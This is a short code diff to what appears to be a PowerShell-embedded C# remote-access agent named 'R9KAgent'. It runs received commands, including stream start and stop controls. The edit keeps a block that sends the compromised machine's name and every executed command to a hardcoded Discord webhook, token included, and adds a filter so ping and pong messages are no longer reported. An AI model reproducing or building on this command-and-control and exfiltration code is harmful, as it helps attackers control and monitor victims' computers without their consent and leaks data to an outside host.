@@ -631,13 +631,15 @@ if (-not ("R9KAgent" -as [type])) {
 
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
-                // Log comando no Discord
-                try { 
-                    System.Net.WebClient wc = new System.Net.WebClient(); 
-                    wc.Headers.Add("Content-Type", "application/json"); 
-                    string body = "{\"content\":\"**[R9K CMD]** " + Environment.MachineName + " executou: " + cmd + "\"}"; 
-                    wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); 
-                } catch {}
+                // Log comando no Discord (Ignorando ping/pong)
+                if (cmd != "pong" && cmd != "ping" && cmd != "PONG" && cmd != "PING") {
+                    try { 
+                        System.Net.WebClient wc = new System.Net.WebClient(); 
+                        wc.Headers.Add("Content-Type", "application/json"); 
+                        string body = "{\"content\":\"**[R9K CMD]** " + Environment.MachineName + " executou: " + cmd + "\"}"; 
+                        wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); 
+                    } catch {}
+                }
 
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
